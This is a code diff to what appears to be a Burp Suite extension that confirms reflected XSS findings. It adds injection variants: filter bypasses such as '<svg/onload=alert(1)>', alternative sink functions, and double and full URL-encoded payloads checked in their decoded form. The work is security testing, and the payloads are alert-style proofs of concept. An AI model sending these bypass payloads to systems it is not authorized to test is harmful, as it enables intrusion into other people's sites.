@@ -1072,19 +1072,31 @@ public class ContextualReflectionEngine {
      * verbatim and unescaped. Records every attempt (for the Edited 1,2,3...
      * request/response views) and reports the winning exploit payload.
      */
+    /** A confirmation attempt: inject {@code inject}, expect {@code expect} back. */
+    private static final class Variant {
+        final String inject;   // value placed into the parameter
+        final String expect;   // what must appear unescaped in the response
+        final String label;
+        Variant(String inject, String expect, String label) {
+            this.inject = inject;
+            this.expect = expect;
+            this.label = label;
+        }
+    }
+
     private Confirmation confirm(Injector injector, IHttpService service, Finding f) {
         Confirmation conf = new Confirmation();
         try {
-            List<String> variants = pocVariants(f);
+            List<Variant> variants = pocVariants(f);
             int tried = 0;
-            for (String poc : variants) {
-                if (tried >= 6) {
+            for (Variant v : variants) {
+                if (tried >= 8) {
                     break; // bound the number of live requests
                 }
                 tried++;
                 String lm = randomCanary();
                 String rm = randomCanary();
-                String value = lm + poc + rm;
+                String value = lm + v.inject + rm;
                 IHttpRequestResponse rr;
                 try {
                     rr = callbacks.makeHttpRequest(service, injector.build(value));
@@ -1104,18 +1116,21 @@ public class ContextualReflectionEngine {
                     int segStart = l + lm.length();
                     int r = bodyStr.indexOf(rm, segStart);
                     String segment = (r > segStart) ? bodyStr.substring(segStart, r)
-                            : bodyStr.substring(segStart, Math.min(bodyStr.length(), segStart + poc.length() + 8));
-                    ok = containsUnescaped(segment, poc);
+                            : bodyStr.substring(segStart, Math.min(bodyStr.length(), segStart + v.expect.length() + 8));
+                    // Check the response for the EXECUTABLE (decoded) form, not the
+                    // injected bytes -- this catches double/extra-decoding contexts
+                    // where an encoded payload comes back decoded.
+                    ok = containsUnescaped(segment, v.expect);
                 }
                 conf.attempts.add(new Attempt("Edited " + (conf.attempts.size() + 1)
-                        + (ok ? " - PoC (confirmed)" : " - variant"), poc, value, rr, ok));
+                        + (ok ? " - PoC (confirmed)" : " - " + v.label), v.expect, value, rr, ok));
                 if (ok) {
                     conf.requestResponse = rr;
                     conf.injectedValue = value;
-                    conf.poc = poc;
+                    conf.poc = v.expect;
                     conf.confirmed = true;
                     conf.snippet = buildSnippet(bodyStr, Math.max(0, l - 24),
-                            poc.length() + lm.length() + rm.length() + 48);
+                            v.expect.length() + lm.length() + rm.length() + 48);
                     return conf;
                 }
             }
@@ -1128,14 +1143,16 @@ public class ContextualReflectionEngine {
     }
 
     /**
-     * Ordered exploit-payload variants for a context: the primary PoC first, then
-     * filter/encoding/keyword bypasses (svg vs img, case mixing, slash tricks)
-     * and the alert / confirm / prompt function alternatives.
+     * Ordered confirmation variants for a context: the primary PoC first, then
+     * filter/keyword bypasses (svg vs img, case mixing, slash tricks), the
+     * alert / confirm / prompt sink functions, and ENCODING bypasses where an
+     * encoded payload is injected but the decoded form is expected back (for
+     * apps that URL-decode an extra time).
      */
-    private List<String> pocVariants(Finding f) {
-        List<String> out = new ArrayList<>();
+    private List<Variant> pocVariants(Finding f) {
+        List<Variant> out = new ArrayList<>();
         String base = f.poc;
-        out.add(base);
+        add(out, new Variant(base, base, "variant"));
 
         int lt = base.indexOf('<');
         if (lt >= 0 && base.indexOf('>', lt) > lt) {
@@ -1150,15 +1167,66 @@ public class ContextualReflectionEngine {
                 "<svg/onload=alert(1)>"              // slash separator bypass
             };
             for (String t : tags) {
-                add(out, prefix + t);
+                add(out, new Variant(prefix + t, prefix + t, "variant"));
             }
         } else {
             // JS / attribute / URL payload: vary the sink function only.
-            add(out, base.replace("alert(1)", "alert(document.domain)"));
-            add(out, base.replace("alert(1)", "confirm(1)"));
-            add(out, base.replace("alert(1)", "prompt(1)"));
+            add(out, new Variant(base.replace("alert(1)", "alert(document.domain)"),
+                    base.replace("alert(1)", "alert(document.domain)"), "variant"));
+            add(out, new Variant(base.replace("alert(1)", "confirm(1)"),
+                    base.replace("alert(1)", "confirm(1)"), "variant"));
+            add(out, new Variant(base.replace("alert(1)", "prompt(1)"),
+                    base.replace("alert(1)", "prompt(1)"), "variant"));
         }
+
+        // Encoding bypasses: inject the percent-encoded payload but expect the
+        // DECODED payload in the response (double/extra-decoding contexts).
+        add(out, new Variant(pctEncode(base), base, "double-URL-encoded"));
+        add(out, new Variant(pctEncodeAll(base), base, "full-URL-encoded"));
         return out;
+    }
+
+    private void add(List<Variant> list, Variant v) {
+        if (v == null || v.inject == null || v.inject.isEmpty()) {
+            return;
+        }
+        for (Variant e : list) {
+            if (e.inject.equals(v.inject)) {
+                return; // de-dup identical injections
+            }
+        }
+        list.add(v);
+    }
+
+    /** Percent-encode only the XSS-significant characters. */
+    private String pctEncode(String s) {
+        StringBuilder b = new StringBuilder();
+        for (int i = 0; i < s.length(); i++) {
+            char c = s.charAt(i);
+            switch (c) {
+                case '<': b.append("%3C"); break;
+                case '>': b.append("%3E"); break;
+                case '"': b.append("%22"); break;
+                case '\'': b.append("%27"); break;
+                case '/': b.append("%2F"); break;
+                case ' ': b.append("%20"); break;
+                case '=': b.append("%3D"); break;
+                case '(': b.append("%28"); break;
+                case ')': b.append("%29"); break;
+                default: b.append(c);
+            }
+        }
+        return b.toString();
+    }
+
+    /** Percent-encode every byte (aggressive full encoding). */
+    private String pctEncodeAll(String s) {
+        StringBuilder b = new StringBuilder();
+        byte[] bytes = s.getBytes(StandardCharsets.UTF_8);
+        for (byte x : bytes) {
+            b.append('%').append(String.format("%02X", x & 0xFF));
+        }
+        return b.toString();
     }
 
     private void add(List<String> list, String s) {
